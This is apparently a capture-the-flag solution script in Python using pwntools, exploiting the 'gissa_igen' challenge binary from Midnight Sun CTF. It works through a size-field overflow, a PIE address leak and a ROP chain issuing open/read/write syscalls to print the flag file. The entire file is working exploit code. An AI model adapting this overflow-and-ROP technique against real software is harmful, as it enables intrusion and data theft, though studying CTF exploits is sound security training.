#!/usr/bin/python
from pwn import *
import sys

HOST = "gissa-igen-01.play.midnightsunctf.se"
PORT = 4096

def exploit(r):
	log.info("Send empty try to increase input size")
	r.recvuntil("): ")
	r.sendline("")

	log.info("Overwrite size with 0xa0 to align it with return address after next read")
	payload = "\xff"*140
	payload += p16(0xa0)
	payload += p16(0x0)

	r.sendline(payload)
	r.recvuntil("): ")

	log.info("Overwrite buffer, so it gets aligned with return address")
	payload = "\xff"*140
	payload += p16(0xffff)
	payload += p16(0xffff)
	payload += "\xff"*(0xa0-len(payload))

	r.send(payload)
	r.recvuntil("): ")
	r.recv(160)
	
	PIELEAK = u64(r.recv(6).ljust(8, "\x00"))
	e.address = PIELEAK - 0xbb7

	log.info("PIELEAK       : %s" % hex(PIELEAK))
	log.info("BASE          : %s" % hex(e.address))

	log.info("Send ropchain to open file and read it again")

	SYSCALL = e.address + 0xbd9
	POPRAXRDIRSI = e.address + 0xc21
	POPRDX98RDIRSI = e.address + 0xc1d

	r.recvuntil(": ")
	r.recvuntil(": ")

	payload = "A"*168
	payload += p64(POPRAXRDIRSI)
	payload += p64(0x40000002)
	payload += p64(next(e.search("/home/ctf/flag")))
	payload += p64(0x0)	
	payload += p64(SYSCALL)
	payload += p64(POPRAXRDIRSI)
	payload += p64(0)
	payload += p64(3)
	payload += p64(e.bss()+100)
	payload += p64(POPRDX98RDIRSI)
	payload += p64(100)
	payload += p64(0)
	payload += p64(0)
	payload += p64(3)
	payload += p64(e.bss()+100)
	payload += p64(SYSCALL)
	payload += p64(POPRAXRDIRSI)
	payload += p64(1)
	payload += p64(1)
	payload += p64(e.bss()+100)
	payload += p64(SYSCALL)

	r.sendline(payload)

	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./gissa_igen")

	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process("./gissa_igen")
		print util.proc.pidof(r)
		pause()
		exploit(r)
